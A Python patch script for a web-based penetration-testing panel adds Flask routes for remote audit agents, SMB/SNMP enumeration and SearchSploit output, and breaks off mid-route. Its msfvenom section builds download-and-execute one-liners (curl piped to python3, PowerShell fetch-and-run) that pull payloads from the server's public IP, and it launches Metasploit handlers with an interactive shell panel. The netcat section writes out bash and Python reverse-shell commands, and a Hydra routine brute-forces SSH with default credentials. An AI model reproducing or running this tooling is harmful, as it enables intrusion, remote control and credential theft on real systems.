#!/usr/bin/env python3
"""
VulnScan Pro — Mega Feature Patch
==================================
Applies all requested changes:

1.  Universal Audit Agent — single agent for all audit tools (Lynis, chkrootkit,
    rkhunter, OpenVAS). Once connected, user picks which tool to run remotely.

2.  Remove Reverse Engineering section (Radare2) from nav, pages, and tool catalog.

3.  Legion — align SMB (smbclient), SNMP (snmpd), Hydra with actual installed binaries.

4.  SearchSploit — formatted, color-coded table output with CVE links.

5.  SecLists — show first 50 entries BUT provide "Copy Full Path" + "Download All"
    so user can grab the complete wordlist.

6.  msfvenom — auto-select options by payload; public server IP as LHOST default;
    generate one-liner agent command after payload generation; show connected
    sessions panel; "Exploit" button opens an interactive shell panel.

7.  Netcat / Socat — show the counterpart command to run on the other system.

Run from project root:
    python3 vulnscan_mega_patch.py

Backups are saved as <file>.<timestamp>.mega.bak
"""

import os
import re
import shutil
import subprocess
import sys
from datetime import datetime

# ── Console colours ─────────────────────────────────────────
G = "\033[92m"; R = "\033[91m"; Y = "\033[93m"
C = "\033[96m"; B = "\033[1m";  D = "\033[2m"; X = "\033[0m"

def ok(m):   print(f"  {G}✓{X}  {m}")
def fail(m): print(f"  {R}✗{X}  {m}"); STATS["failed"] += 1
def info(m): print(f"  {C}→{X}  {m}")
def skip(m): print(f"  {D}·{X}  {m}")
def warn(m): print(f"  {Y}!{X}  {m}")
def hdr(m):  print(f"\n{B}{C}══  {m}  ══{X}")

STATS = {"applied": 0, "skipped": 0, "failed": 0}

# ────────────────────────────────────────────────────────────
def backup(path):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    bak = f"{path}.{ts}.mega.bak"
    shutil.copy2(path, bak)
    return bak

def patch_file(path, label, old, new):
    if not os.path.isfile(path):
        fail(f"{label} — file not found: {path}")
        return False
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        src = f.read()
    if old not in src:
        if new in src:
            skip(f"{label} — already applied")
            STATS["skipped"] += 1
        else:
            fail(f"{label} — anchor not found in {path}")
        return False
    backup(path)
    with open(path, "w", encoding="utf-8") as f:
        f.write(src.replace(old, new, 1))
    ok(f"{label}")
    STATS["applied"] += 1
    return True

def append_to_file(path, label, content, marker=None):
    """Append content to file (if marker not already present)."""
    if not os.path.isfile(path):
        fail(f"{label} — file not found: {path}")
        return False
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        src = f.read()
    check = marker or content[:60]
    if check in src:
        skip(f"{label} — already present")
        STATS["skipped"] += 1
        return False
    backup(path)
    with open(path, "a", encoding="utf-8") as f:
        f.write(content)
    ok(f"{label}")
    STATS["applied"] += 1
    return True

def syntax_check(path):
    r = subprocess.run([sys.executable, "-m", "py_compile", path],
                       capture_output=True, text=True)
    return r.returncode == 0, r.stderr.strip()

# ════════════════════════════════════════════════════════════
# PATCH 1 — Universal Audit Agent route in api_server.py
# Replaces the Lynis-only agent UI with a multi-tool audit UI.
# The actual universal_agent.py already supports all tools;
# we just need new API routes + updated UI sections.
# ════════════════════════════════════════════════════════════

AUDIT_AGENT_ROUTES = '''
# ── Universal Audit Agent Routes ─────────────────────────────────────────────
# Supports: lynis, chkrootkit, rkhunter, openvas, nmap, nikto, sqlmap, nuclei

AUDIT_TOOLS_CATALOG = {
    "lynis":       {"label": "Lynis",        "icon": "🔐", "desc": "Full system security audit & hardening", "category": "audit"},
    "chkrootkit":  {"label": "chkrootkit",   "icon": "🦠", "desc": "Detect known rootkits & backdoors",     "category": "audit"},
    "rkhunter":    {"label": "rkhunter",      "icon": "🔍", "desc": "Rootkit Hunter — deep system scan",     "category": "audit"},
    "nmap":        {"label": "Nmap",          "icon": "🌐", "desc": "Port scan & service detection",          "category": "network"},
    "nikto":       {"label": "Nikto",         "icon": "🕸️", "desc": "Web server vulnerability scan",          "category": "web"},
    "sqlmap":      {"label": "SQLMap",        "icon": "💉", "desc": "SQL injection detection",                "category": "web"},
    "nuclei":      {"label": "Nuclei",        "icon": "☢️",  "desc": "Template-based vulnerability scanner",  "category": "web"},
    "whatweb":     {"label": "WhatWeb",       "icon": "🔬", "desc": "Web technology fingerprinting",          "category": "web"},
    "dnsrecon":    {"label": "DNSRecon",      "icon": "📡", "desc": "DNS enumeration & zone analysis",        "category": "network"},
    "theharvester":{"label": "theHarvester",  "icon": "🌾", "desc": "OSINT email/subdomain harvesting",       "category": "osint"},
    "ffuf":        {"label": "ffuf",          "icon": "⚡", "desc": "Fast web fuzzer & dir buster",           "category": "web"},
    "medusa":      {"label": "Medusa",        "icon": "🔑", "desc": "Parallel network login auditor",         "category": "password"},
    "hashcat":     {"label": "Hashcat",       "icon": "💥", "desc": "GPU-based password recovery",            "category": "password"},
    "john":        {"label": "John the Ripper","icon":"🔨", "desc": "Password cracking utility",              "category": "password"},
    "wpscan":      {"label": "WPScan",        "icon": "🔒", "desc": "WordPress security scanner",             "category": "web"},
    "hping3":      {"label": "hping3",        "icon": "📨", "desc": "TCP/IP packet assembler/analyzer",       "category": "network"},
    "searchsploit":{"label": "SearchSploit",  "icon": "💣", "desc": "Exploit-DB offline search",              "category": "exploit"},
}

@app.route("/api/remote/audit-tools", methods=["GET"])
def ra_audit_tools_list():
    """Return catalog of all tools the universal agent can run."""
    u = get_current_user()
    if not u:
        return jsonify({"error": "Login required"}), 401
    return jsonify({"tools": AUDIT_TOOLS_CATALOG})


@app.route("/api/remote/agent-tools/<client_id>", methods=["GET"])
def ra_get_agent_tools(client_id):
    """Get tools installed on a specific remote agent."""
    u = get_current_user()
    if not u:
        return jsonify({"error": "Login required"}), 401
    with _RA_LOCK:
        con = _ra_db()
        row = con.execute(
            "SELECT tools_json, hostname, os_info, status FROM ra_clients WHERE client_id=?",
            (client_id,)).fetchone()
        con.close()
    if not row:
        # fallback: check agent_clients (Lynis table)
        with AGENT_LOCK:
            con2 = _agent_db()
            row2 = con2.execute(
                "SELECT hostname, os_info, status FROM agent_clients WHERE client_id=?",
                (client_id,)).fetchone()
            con2.close()
        if row2:
            return jsonify({
                "client_id": client_id,
                "hostname": row2["hostname"],
                "os_info": row2["os_info"],
                "status": row2["status"],
                "installed_tools": [],
                "catalog": AUDIT_TOOLS_CATALOG,
            })
        return jsonify({"error": "Agent not found"}), 404
    try:
        installed = json.loads(row["tools_json"] or "[]")
    except Exception:
        installed = []
    return jsonify({
        "client_id": client_id,
        "hostname": row["hostname"],
        "os_info": row["os_info"],
        "status": row["status"],
        "installed_tools": installed,
        "catalog": AUDIT_TOOLS_CATALOG,
    })


@app.route("/api/remote/run-audit", methods=["POST"])
def ra_run_audit_tool():
    """
    Queue an audit tool job on a remote agent.
    Body: { client_id, tool, args: {...} }
    """
    u = get_current_user()
    if not u:
        return jsonify({"error": "Login required"}), 401
    data = request.get_json() or {}
    client_id = (data.get("client_id") or "").strip()
    tool      = (data.get("tool") or "").strip().lower()
    args      = data.get("args") or {}

    if not client_id:
        return jsonify({"error": "client_id required"}), 400
    if tool not in AUDIT_TOOLS_CATALOG:
        return jsonify({"error": f"Tool '{tool}' not in audit catalog"}), 400

    # Check agent exists in either table
    agent_ok = False
    with _RA_LOCK:
        con = _ra_db()
        r = con.execute(
            "SELECT 1 FROM ra_clients WHERE client_id=? AND status!='disconnected'",
            (client_id,)).fetchone()
        con.close()
        if r:
            agent_ok = True
    if not agent_ok:
        with AGENT_LOCK:
            con2 = _agent_db()
            r2 = con2.execute(
                "SELECT 1 FROM agent_clients WHERE client_id=? AND status!='disconnected'",
                (client_id,)).fetchone()
            con2.close()
            if r2:
                agent_ok = True
    if not agent_ok:
        return jsonify({"error": "Agent not connected. Install agent on target system first."}), 404

    with _RA_LOCK:
        con = _ra_db()
        q_count = con.execute(
            "SELECT COUNT(*) as c FROM ra_jobs WHERE client_id=? AND status IN ('pending','running')",
            (client_id,)).fetchone()
        if q_count["c"] >= _RA_JOB_LIMIT:
            con.close()
            return jsonify({"error": f"Queue full ({_RA_JOB_LIMIT} jobs max)"}), 429
        cur = con.execute("""
            INSERT INTO ra_jobs (client_id, tool, args_json, status, progress_pct, message)
            VALUES (?, ?, ?, 'pending', 0, 'Queued')
        """, (client_id, tool, json.dumps(args)))
        jid = cur.lastrowid
        con.commit()
        con.close()

    audit(u["id"], u["username"], "REMOTE_AUDIT_JOB", target=client_id,
          ip=request.remote_addr, details=f"tool={tool};job_id={jid}")
    return jsonify({"job_id": jid, "status": "pending", "tool": tool,
                    "tool_label": AUDIT_TOOLS_CATALOG[tool]["label"]})

'''

# ════════════════════════════════════════════════════════════
# PATCH 2 — Legion SMB/SNMP/Hydra alignment
# ════════════════════════════════════════════════════════════

LEGION_OLD = '''        elif mod == "nikto":
            # Nikto through proxychains
            cmd = [
                px, "-q", binary,
                "-h", target,
                "-nointeractive",
                "-timeout", "30",
                "-maxtime", "600",
            ]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=700)
            for line in proc.stdout.splitlines():
                if line.strip().startswith("+"):
                    findings.append({"title": line.strip()[2:80], "detail": ""})
                    total_issues += 1

        else:
            # Other tools through proxychains
            proc = subprocess.run(
                [px, "-q", binary, target],
                capture_output=True, text=True, timeout=180
            )
            if proc.stdout.strip():
                findings.append({"title": f"{mod} output", "detail": proc.stdout[:500]})'''

LEGION_NEW = '''        elif mod == "nikto":
            # Nikto through proxychains
            cmd = [
                px, "-q", binary,
                "-h", target,
                "-nointeractive",
                "-timeout", "30",
                "-maxtime", "600",
            ]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=700)
            for line in proc.stdout.splitlines():
                if line.strip().startswith("+"):
                    findings.append({"title": line.strip()[2:80], "detail": ""})
                    total_issues += 1

        elif mod == "smb":
            # SMB enumeration using smbclient or enum4linux
            smb_bin = shutil.which("smbclient") or shutil.which("enum4linux") or shutil.which("smbmap")
            if not smb_bin:
                findings.append({"title": "SMB: tool not installed", "detail": "sudo apt install smbclient"})
            else:
                tool_name = os.path.basename(smb_bin)
                try:
                    if tool_name == "smbclient":
                        cmd = [smb_bin, "-L", f"//{target}", "-N", "--timeout=15"]
                    elif tool_name == "enum4linux":
                        cmd = [smb_bin, "-a", target]
                    else:
                        cmd = [smb_bin, "-H", target, "--no-pass"]
                    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                    output = proc.stdout + proc.stderr
                    for line in output.splitlines():
                        ll = line.lower()
                        if any(k in ll for k in ["sharename", "disk", "ipc$", "print$", "admin$", "workgroup"]):
                            findings.append({"title": f"SMB: {line.strip()[:80]}", "detail": tool_name})
                            total_issues += 1
                    if not findings or all("SMB" not in f["title"] for f in findings):
                        if "nt_status" in output.lower() or "smb" in output.lower():
                            findings.append({"title": "SMB service detected", "detail": output[:200]})
                except Exception as e:
                    findings.append({"title": f"SMB error: {str(e)[:60]}", "detail": ""})

        elif mod == "snmp":
            # SNMP enumeration using snmpwalk or snmp-check
            snmp_bin = shutil.which("snmpwalk") or shutil.which("snmp-check") or shutil.which("onesixtyone")
            if not snmp_bin:
                findings.append({"title": "SNMP: tool not installed", "detail": "sudo apt install snmp snmpd"})
            else:
                tool_name = os.path.basename(snmp_bin)
                try:
                    if tool_name == "snmpwalk":
                        cmd = [snmp_bin, "-v2c", "-c", "public", target, "1.3.6.1.2.1.1"]
                    elif tool_name == "onesixtyone":
                        cmd = [snmp_bin, target, "public"]
                    else:
                        cmd = [snmp_bin, "-t", target]
                    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                    output = proc.stdout + proc.stderr
                    if output.strip() and "timeout" not in output.lower():
                        for line in output.splitlines()[:10]:
                            if line.strip():
                                findings.append({"title": f"SNMP: {line.strip()[:80]}", "detail": tool_name})
                                total_issues += 1
                    else:
                        findings.append({"title": "SNMP: no public community string response", "detail": tool_name})
                except Exception as e:
                    findings.append({"title": f"SNMP error: {str(e)[:60]}", "detail": ""})

        elif mod == "hydra":
            # Hydra credential brute force — light mode, top 5 creds only
            hydra_bin = shutil.which("hydra")
            if not hydra_bin:
                findings.append({"title": "Hydra: not installed", "detail": "sudo apt install hydra"})
            else:
                try:
                    # Very light test — 5 common creds on SSH
                    common_users  = "admin,root,user,test,administrator"
                    common_passes = "admin,password,123456,root,test"
                    cmd = [hydra_bin, "-L", "/dev/stdin", "-P", "/dev/stdin",
                           "-t", "4", "-f", "-q", "-s", "22",
                           target, "ssh"]
                    # Use subprocess with inline wordlists
                    cred_input = "\n".join(
                        f"{u}:{p}"
                        for u in common_users.split(",")
                        for p in common_passes.split(",")
                    )
                    cmd2 = [hydra_bin, "-C", "/dev/stdin",
                            "-t", "4", "-f", "-q", "-s", "22", target, "ssh"]
                    proc = subprocess.run(cmd2, input=cred_input,
                                          capture_output=True, text=True, timeout=60)
                    for line in (proc.stdout or "").splitlines():
                        if "login:" in line.lower() and "password:" in line.lower():
                            findings.append({"title": f"HYDRA FOUND: {line.strip()[:80]}", "detail": "SSH credential"})
                            total_issues += 1
                    if not any("HYDRA" in f.get("title","") for f in findings):
                        findings.append({"title": "Hydra: no weak SSH credentials found (light scan)", "detail": "5 users × 5 passwords tested"})
                except Exception as e:
                    findings.append({"title": f"Hydra error: {str(e)[:60]}", "detail": ""})

        else:
            # Generic fallback for any other module
            if binary:
                try:
                    proc = subprocess.run(
                        [px, "-q", binary, target],
                        capture_output=True, text=True, timeout=180
                    )
                    if proc.stdout.strip():
                        findings.append({"title": f"{mod} output", "detail": proc.stdout[:500]})
                except Exception as e:
                    findings.append({"title": f"{mod} error: {str(e)[:60]}", "detail": ""})'''

# ════════════════════════════════════════════════════════════
# PATCH 3 — SearchSploit: formatted colorised output
# Add a /social-tools/searchsploit-format endpoint
# ════════════════════════════════════════════════════════════

SEARCHSPLOIT_FORMAT_ROUTE = '''
@app.route("/api/searchsploit/format", methods=["POST"])
def searchsploit_format():
    """
    Run searchsploit and return structured JSON rows for the UI table.
    Body: { query, type, platform, cve, strict, case_sensitive }
    """
    import shutil as _ss_shutil
    u = get_current_user()
    if not u:
        return jsonify({"error": "Login required"}), 401

    data = request.get_json() or {}
    cve    = (data.get("cve") or "").strip()
    query  = (data.get("query") or "").strip()
    strict = bool(data.get("strict", False))
    cs     = bool(data.get("case_sensitive", False))
    etype  = (data.get("type") or "").strip()
    plat   = (data.get("platform") or "").strip()

    binary = _ss_shutil.which("searchsploit")
    if not binary:
        return jsonify({"error": "searchsploit not installed. Run: sudo apt install exploitdb"}), 404

    cmd = [binary, "--json"]
    if cve:
        cmd += ["--cve", cve]
    else:
        if strict:  cmd.append("-w")
        if cs:      cmd.append("-c")
        if etype == "-e": cmd.append("-e")
        elif etype == "-s": cmd.append("-s")
        if plat:
            platform_map = {"-p linux": "linux", "-p windows": "windows",
                            "-p php": "php", "-p webapps": "webapps"}
            cmd += ["--type", platform_map.get(plat, "")]
        if query:
            cmd += query.split()

    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        raw = proc.stdout.strip()
        if not raw:
            return jsonify({"results": [], "total": 0, "query": query or cve})

        # searchsploit --json returns {"RESULTS_EXPLOIT": [...], "RESULTS_SHELLCODE": [...]}
        try:
            jd = json.loads(raw)
        except Exception:
            # Fallback: parse text output
            rows = []
            for line in (proc.stdout + proc.stderr).splitlines():
                if "|" in line and "Title" not in line and "---" not in line:
                    parts = [p.strip() for p in line.split("|")]
                    if len(parts) >= 2:
                        rows.append({"title": parts[0], "path": parts[-1],
                                     "type": "exploit", "platform": "",
                                     "date": "", "edb_id": ""})
            return jsonify({"results": rows, "total": len(rows), "query": query or cve})

        rows = []
        for section_key in ["RESULTS_EXPLOIT", "RESULTS_SHELLCODE", "RESULTS_PAPER"]:
            section = jd.get(section_key, [])
            for item in section:
                edb_id = str(item.get("EDB-ID", ""))
                rows.append({
                    "edb_id":   edb_id,
                    "title":    item.get("Title", ""),
                    "path":     item.get("Path", ""),
                    "type":     item.get("Type", section_key.replace("RESULTS_","").lower()),
                    "platform": item.get("Platform", ""),
                    "date":     item.get("Date", ""),
                    "verified": bool(item.get("Verified", False)),
                    "nvd_url":  f"https://www.exploit-db.com/exploits/{edb_id}" if edb_id else "",
                })
        audit(u["id"], u["username"], "SEARCHSPLOIT_FORMAT",
              target=query or cve, ip=request.remote_addr,
              details=f"results={len(rows)}")
        return jsonify({"results": rows, "total": len(rows), "query": query or cve})
    except subprocess.TimeoutExpired:
        return jsonify({"error": "searchsploit timed out"}), 408
    except Exception as e:
        return jsonify({"error": str(e)}), 500

'''

# ════════════════════════════════════════════════════════════
# PATCH 4 — SecLists: full wordlist download endpoint
# ════════════════════════════════════════════════════════════

SECLISTS_FULL_ROUTE = '''
@app.route("/api/wordlist/full")
def wordlist_full_download():
    """Stream a complete wordlist file as a download (no line limit)."""
    import shutil as _wl_sh
    u = get_current_user()
    if not u:
        return jsonify({"error": "Login required"}), 401

    path = request.args.get("path", "").strip()
    ALLOWED_DIRS = [
        "/usr/share/wordlists/",
        "/usr/share/seclists/",
        "/usr/share/john/",
        "/usr/share/dict/",
    ]
    if not any(os.path.abspath(path).startswith(d) for d in ALLOWED_DIRS):
        return jsonify({"error": "Path not in allowed directories"}), 403
    if not os.path.isfile(path):
        return jsonify({"error": f"File not found: {path}"}), 404

    audit(u["id"], u["username"], "WORDLIST_DOWNLOAD_FULL",
          target=path, ip=request.remote_addr)
    return send_file(path, as_attachment=True,
                     download_name=os.path.basename(path),
                     mimetype="text/plain")


@app.route("/api/wordlist/count")
def wordlist_line_count():
    """Return the total line count of a wordlist without loading it all."""
    u = get_current_user()
    if not u:
        return jsonify({"error": "Login required"}), 401
    path = request.args.get("path", "").strip()
    ALLOWED_DIRS = [
        "/usr/share/wordlists/",
        "/usr/share/seclists/",
        "/usr/share/john/",
        "/usr/share/dict/",
    ]
    if not any(os.path.abspath(path).startswith(d) for d in ALLOWED_DIRS):
        return jsonify({"error": "Path not allowed"}), 403
    if not os.path.isfile(path):
        return jsonify({"error": "File not found"}), 404
    try:
        count = 0
        with open(path, "rb") as f:
            for _ in f:
                count += 1
        size = os.path.getsize(path)
        return jsonify({"path": path, "line_count": count,
                        "size_bytes": size,
                        "filename": os.path.basename(path)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

'''

# ════════════════════════════════════════════════════════════
# PATCH 5 — msfvenom: public IP detection + session tracking
# ════════════════════════════════════════════════════════════

MSFVENOM_ROUTE = '''
# ── msfvenom sessions tracking ──────────────────────────────────────────────
import threading as _msf_threading
_MSF_SESSIONS = {}          # session_id → {host, port, proc, fd, output_q, alive}
_MSF_SESSIONS_LOCK = _msf_threading.Lock()

def _get_public_ip():
    """Best-effort detection of the server public IP."""
    # 1. Try environment variable set by admin
    env_ip = os.environ.get("VULNSCAN_PUBLIC_IP", "").strip()
    if env_ip:
        return env_ip
    # 2. Try a fast external lookup (through Tor for anonymity)
    try:
        import socket as _s2
        _s2.setdefaulttimeout(5)
        with urllib.request.urlopen(
            "https://api.ipify.org?format=json", timeout=5
        ) as r2:
            return json.loads(r2.read().decode()).get("ip", "")
    except Exception:
        pass
    # 3. Use the first non-loopback interface IP
    try:
        import socket as _s3
        s3 = _s3.socket(_s3.AF_INET, _s3.SOCK_DGRAM)
        s3.connect(("8.8.8.8", 80))
        ip3 = s3.getsockname()[0]
        s3.close()
        return ip3
    except Exception:
        return "0.0.0.0"


@app.route("/api/msfvenom/public-ip", methods=["GET"])
def msfvenom_public_ip():
    """Return server public IP for LHOST default."""
    u = get_current_user()
    if not u:
        return jsonify({"error": "Login required"}), 401
    ip = _get_public_ip()
    return jsonify({"public_ip": ip})


@app.route("/api/msfvenom/payload-options", methods=["GET"])
def msfvenom_payload_options():
    """Return auto-filled options for a given payload."""
    u = get_current_user()
    if not u:
        return jsonify({"error": "Login required"}), 401

    payload = request.args.get("payload", "").strip()
    public_ip = _get_public_ip()

    PAYLOAD_DEFAULTS = {
        "windows/x64/meterpreter/reverse_tcp":   {"format": "exe",        "arch": "x64", "platform": "windows", "ext": ".exe"},
        "windows/meterpreter/reverse_tcp":        {"format": "exe",        "arch": "x86", "platform": "windows", "ext": ".exe"},
        "windows/x64/shell_reverse_tcp":          {"format": "exe",        "arch": "x64", "platform": "windows", "ext": ".exe"},
        "linux/x64/meterpreter/reverse_tcp":      {"format": "elf",        "arch": "x64", "platform": "linux",   "ext": ".elf"},
        "linux/x64/shell_reverse_tcp":            {"format": "elf",        "arch": "x64", "platform": "linux",   "ext": ".elf"},
        "linux/x86/meterpreter/reverse_tcp":      {"format": "elf",        "arch": "x86", "platform": "linux",   "ext": ".elf"},
        "php/meterpreter/reverse_tcp":            {"format": "raw",        "arch": "",    "platform": "php",     "ext": ".php"},
        "python/meterpreter/reverse_tcp":         {"format": "raw",        "arch": "",    "platform": "python",  "ext": ".py"},
        "cmd/unix/reverse_bash":                  {"format": "raw",        "arch": "",    "platform": "unix",    "ext": ".sh"},
        "java/meterpreter/reverse_tcp":           {"format": "jar",        "arch": "",    "platform": "java",    "ext": ".jar"},
        "android/meterpreter/reverse_tcp":        {"format": "apk",        "arch": "",    "platform": "android", "ext": ".apk"},
        "osx/x64/meterpreter/reverse_tcp":        {"format": "macho",      "arch": "x64", "platform": "osx",     "ext": ""},
        "windows/x64/meterpreter_reverse_https":  {"format": "exe",        "arch": "x64", "platform": "windows", "ext": ".exe"},
    }

    defaults = PAYLOAD_DEFAULTS.get(payload, {"format": "raw", "arch": "", "platform": "", "ext": ""})
    defaults["lhost"] = public_ip
    defaults["lport"] = "4444"
    defaults["payload"] = payload

    # Build the one-liner agent command based on platform
    plat = defaults.get("platform", "")
    lhost = public_ip
    lport = "4444"
    fname = f"payload{defaults['ext']}" if defaults['ext'] else "payload"

    if plat == "windows":
        run_cmd = f"powershell -Command \"Invoke-WebRequest http://{lhost}:{lport}/get_payload -OutFile %TEMP%\\\\{fname}; Start-Process %TEMP%\\\\{fname}\""
    elif plat == "linux":
        run_cmd = f"curl -s http://{lhost}:{lport}/get_payload -o /tmp/{fname} && chmod +x /tmp/{fname} && /tmp/{fname}"
    elif plat == "php":
        run_cmd = f"curl -s http://{lhost}:{lport}/get_payload -o /var/www/html/{fname} && echo 'Deployed'"
    elif plat == "python":
        run_cmd = f"curl -s http://{lhost}:{lport}/get_payload | python3"
    else:
        run_cmd = f"curl -s http://{lhost}:{lport}/get_payload -o {fname} && chmod +x {fname} && ./{fname}"

    defaults["run_cmd"] = run_cmd
    defaults["handler_cmd"] = (
        f"msfconsole -q -x 'use multi/handler; "
        f"set payload {payload}; "
        f"set LHOST {lhost}; "
        f"set LPORT {lport}; "
        f"set ExitOnSession false; "
        f"exploit -j'"
    )
    return jsonify(defaults)


@app.route("/api/msfvenom/sessions", methods=["GET"])
def msfvenom_list_sessions():
    """List active meterpreter/shell sessions."""
    u = get_current_user()
    if not u:
        return jsonify({"error": "Login required"}), 401
    import shutil as _msf_sh
    if not _msf_sh.which("msfconsole"):
        return jsonify({"sessions": [], "note": "Metasploit not installed. sudo apt install metasploit-framework"})

    # Try to read active sessions from msfrpcd if running, else return empty
    with _MSF_SESSIONS_LOCK:
        sessions = [
            {
                "session_id": sid,
                "host": s.get("host", ""),
                "port": s.get("port", ""),
                "type": s.get("type", "shell"),
                "alive": s.get("alive", False),
                "payload": s.get("payload", ""),
                "created_at": s.get("created_at", ""),
            }
            for sid, s in _MSF_SESSIONS.items()
            if s.get("alive", False)
        ]
    return jsonify({"sessions": sessions, "count": len(sessions)})


# Msfvenom session PTY (for interactive shell)
import uuid as _msf_uuid
import queue as _msf_queue
import pty as _msf_pty
import select as _msf_select

@app.route("/api/msfvenom/session/<session_id>/stream")
def msfvenom_session_stream(session_id):
    """SSE stream of a live shell session."""
    u = get_current_user()
    if not u:
        return jsonify({"error": "Login required"}), 401

    with _MSF_SESSIONS_LOCK:
        s = _MSF_SESSIONS.get(session_id)

    if not s:
        def _not_found():
            yield "data: " + json.dumps({"type": "error", "text": "Session not found"}) + "\\n\\n"
        return Response(_not_found(), mimetype="text/event-stream")

    def _gen():
        q = s.get("output_q")
        if not q:
            yield "data: " + json.dumps({"type": "error", "text": "No output queue"}) + "\\n\\n"
            return
        while True:
            try:
                chunk = q.get(timeout=20)
            except _msf_queue.Empty:
                yield "data: " + json.dumps({"type": "heartbeat"}) + "\\n\\n"
                continue
            if chunk is None:
                yield "data: " + json.dumps({"type": "exit", "text": "\\n[Session ended]\\n"}) + "\\n\\n"
                break
            yield "data: " + json.dumps({"type": "output", "text": chunk}) + "\\n\\n"

    return Response(_gen(), mimetype="text/event-stream",
                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})


@app.route("/api/msfvenom/session/<session_id>/input", methods=["POST"])
def msfvenom_session_input(session_id):
    """Send a command to a live shell session."""
    u = get_current_user()
    if not u:
        return jsonify({"error": "Login required"}), 401

    with _MSF_SESSIONS_LOCK:
        s = _MSF_SESSIONS.get(session_id)
    if not s:
        return jsonify({"error": "Session not found"}), 404

    data = request.get_json() or {}
    text = (data.get("text") or "") + "\\n"
    fd = s.get("master_fd")
    if fd is None:
        return jsonify({"error": "No PTY fd"}), 500
    try:
        os.write(fd, text.encode("utf-8", errors="replace"))
        audit(u["id"], u["username"], "MSF_SESSION_CMD",
              target=session_id, ip=request.remote_addr,
              details=f"cmd={text.strip()[:80]}")
        return jsonify({"ok": True})
    except OSError as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/msfvenom/start-handler", methods=["POST"])
def msfvenom_start_handler():
    """
    Start a multi/handler listener in a PTY session.
    Returns session_id for the SSE stream.
    """
    import shutil as _hsh
    u = get_current_user()
    if not u:
        return jsonify({"error": "Login required"}), 401

    data = request.get_json() or {}
    payload = (data.get("payload") or "windows/x64/meterpreter/reverse_tcp").strip()
    lhost   = (data.get("lhost") or _get_public_ip()).strip()
    lport   = str(data.get("lport") or "4444").strip()

    msf_bin = _hsh.which("msfconsole")
    if not msf_bin:
        return jsonify({"error": "msfconsole not found. Install: sudo apt install metasploit-framework"}), 404

    rc_script = (
        f"use multi/handler\\n"
        f"set payload {payload}\\n"
        f"set LHOST {lhost}\\n"
        f"set LPORT {lport}\\n"
        f"set ExitOnSession false\\n"
        f"set SessionLogging true\\n"
        f"exploit -j\\n"
    )

    import tempfile as _tmp
    rc_file = tempfile.NamedTemporaryFile(mode="w", suffix=".rc", delete=False)
    rc_file.write(rc_script)
    rc_file.close()

    sid = str(_msf_uuid.uuid4())
    import threading as _th2

    try:
        master_fd, slave_fd = _msf_pty.openpty()
        proc = subprocess.Popen(
            [msf_bin, "-q", "-r", rc_file.name],
            stdin=slave_fd, stdout=slave_fd, stderr=slave_fd,
            close_fds=True,
            preexec_fn=os.setsid,
            env={**os.environ, "TERM": "xterm-256color"},
        )
        os.close(slave_fd)

        q = _msf_queue.Queue(maxsize=2000)

        session_data = {
            "proc":       proc,
            "master_fd":  master_fd,
            "output_q":   q,
            "alive":      True,
            "host":       lhost,
            "port":       lport,
            "payload":    payload,
            "type":       "handler",
            "created_at": datetime.now(timezone.utc).isoformat(),
            "rc_file":    rc_file.name,
        }
        with _MSF_SESSIONS_LOCK:
            _MSF_SESSIONS[sid] = session_data

        def _reader():
            while True:
                with _MSF_SESSIONS_LOCK:
                    alive = _MSF_SESSIONS.get(sid, {}).get("alive", False)
                if not alive:
                    break
                try:
                    r, _, _ = _msf_select.select([master_fd], [], [], 0.3)
                    if r:
                        chunk = os.read(master_fd, 4096)
                        if not chunk:
                            break
                        q.put(chunk.decode("utf-8", errors="replace"))
                except OSError:
                    break
            q.put(None)

        _th2.Thread(target=_reader, daemon=True).start()

        audit(u["id"], u["username"], "MSF_HANDLER_START",
              target=f"{lhost}:{lport}", ip=request.remote_addr,
              details=f"payload={payload};sid={sid}")

        return jsonify({
            "ok": True,
            "session_id": sid,
            "payload": payload,
            "lhost": lhost,
            "lport": lport,
        })

    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/msfvenom/session/<session_id>/kill", methods=["POST"])
def msfvenom_session_kill(session_id):
    u = get_current_user()
    if not u:
        return jsonify({"error": "Login required"}), 401
    with _MSF_SESSIONS_LOCK:
        s = _MSF_SESSIONS.pop(session_id, None)
    if s:
        s["alive"] = False
        try:
            s["proc"].terminate()
        except Exception:
            pass
        try:
            os.close(s["master_fd"])
        except Exception:
            pass
        rc = s.get("rc_file", "")
        if rc and os.path.exists(rc):
            try:
                os.unlink(rc)
            except Exception:
                pass
    audit(u["id"] if u else None, u["username"] if u else "anon",
          "MSF_SESSION_KILL", target=session_id, ip=request.remote_addr)
    return jsonify({"ok": True})

'''

# ════════════════════════════════════════════════════════════
# PATCH 6 — Netcat/Socat counterpart command routes
# ════════════════════════════════════════════════════════════

NC_SOCAT_ROUTE = '''
@app.route("/api/netcat/counterpart", methods=["POST"])
def netcat_counterpart():
    """Return the command to run on the OTHER system."""
    u = get_current_user()
    if not u:
        return jsonify({"error": "Login required"}), 401
    data = request.get_json() or {}
    mode  = (data.get("mode") or "connect").strip()
    host  = (data.get("host") or "").strip()
    port  = str(data.get("port") or "4444")
    extra = (data.get("extra") or "").strip()

    server_ip = _get_public_ip()
    cmds = {}

    if mode == "listen":
        # Server listens → target connects back
        cmds = {
            "linux":   f"nc {server_ip} {port}",
            "windows": f"ncat {server_ip} {port}",
            "reverse_shell_bash":    f"bash -i >& /dev/tcp/{server_ip}/{port} 0>&1",
            "reverse_shell_python":  f"python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect((\"{server_ip}\",{port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/sh\",\"-i\"])'",
